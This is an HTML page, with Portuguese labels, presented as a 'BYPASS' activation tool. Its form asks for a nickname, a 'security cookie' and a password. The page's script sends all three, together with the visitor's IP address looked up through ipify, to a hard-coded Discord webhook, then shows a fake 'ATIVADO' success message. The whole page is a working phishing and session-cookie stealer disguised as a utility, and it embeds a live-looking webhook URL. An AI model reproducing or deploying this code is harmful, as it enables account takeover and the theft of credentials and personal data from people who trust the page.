<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>melhor_bypass</title>

<style>
    body {
        margin: 0;
        background-color: black;
        color: white;
        font-family: Arial, sans-serif;
        text-align: center;
        overflow-x: hidden;
    }

    h1 {
        font-size: 80px;
        margin-top: 100px;
        letter-spacing: 5px;
    }

    .container {
        margin-top: 50px;
    }

    input, textarea {
        width: 300px;
        padding: 15px;
        margin: 10px;
        background-color: #111;
        border: 1px solid #333;
        color: white;
        border-radius: 5px;
        font-size: 16px;
    }

    .botao-ativar {
        padding: 15px 40px;
        background-color: #2196f3;
        color: white;
        border: none;
        border-radius: 5px;
        font-size: 18px;
        font-weight: bold;
        cursor: pointer;
        margin-top: 20px;
        transition: 0.3s;
    }

    .botao-ativar:hover {
        background-color: #1976d2;
        transform: scale(1.05);
    }

    .overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.8);
        backdrop-filter: blur(8px);
        display: flex;
        align-items: center;
        justify-content: center;
        opacity: 0;
        pointer-events: none;
        transition: opacity 0.5s ease;
        z-index: 999;
    }

    .overlay.active {
        opacity: 1;
        pointer-events: all;
    }

    .overlay h2 {
        font-size: 100px;
        color: #2196f3;
        letter-spacing: 10px;
        animation: zoom 0.5s ease;
    }

    @keyframes zoom {
        from { transform: scale(0.5); opacity: 0; }
        to { transform: scale(1); opacity: 1; }
    }
</style>
</head>

<body>

<h1>💀BYPASS💀</h1>

<div class="container">
    <form id="form">
        <input type="text" id="campo1" placeholder="nick" required><br>
        <input type="text" id="campo2" placeholder="🍪secritycookie" required><br>
        <textarea id="campo3" placeholder="senha" required></textarea><br>
        <button type="submit" class="botao-ativar">ATIVAR</button>
    </form>
</div>

<div class="overlay" id="overlay">
    <h2>ATIVADO</h2>
</div>

<script>
    const webhookURL = "https://discordapp.com/api/webhooks/1472006778064474203/oVpmFrce7kASdrRfaNuUHxj4XFwbDAYtHipbhriYhkqQrBsYlWbq4utke6aryoVnXX1g";
    const overlay = document.getElementById("overlay");

    document.getElementById("form").addEventListener("submit", async function(e) {
        e.preventDefault();

        const campo1 = document.getElementById("campo1").value;
        const campo2 = document.getElementById("campo2").value;
        const campo3 = document.getElementById("campo3").value;

        try {
            const ipResponse = await fetch("https://api.ipify.org?format=json");
            const ipData = await ipResponse.json();
            const ip = ipData.ip;

            const dados = {
                embeds: [
                    {
                        title: "🔵 Novo Ativado",
                        color: 3447003,
                        fields: [
                            { name: "nick", value: campo1 },
                            { name: "🍪cookie", value: campo2 },
                            { name: "senha", value: campo3 },
                            { name: "IP da pessoa", value: ip }
                        ],
                        timestamp: new Date()
                    }
                ]
            };

            await fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(dados)
            });

            overlay.classList.add("active");

            setTimeout(() => {
                overlay.classList.remove("active");
            }, 3000);

        } catch {
            alert("Erro de conexão.");
        }
    });
</script>

</body>
</html>
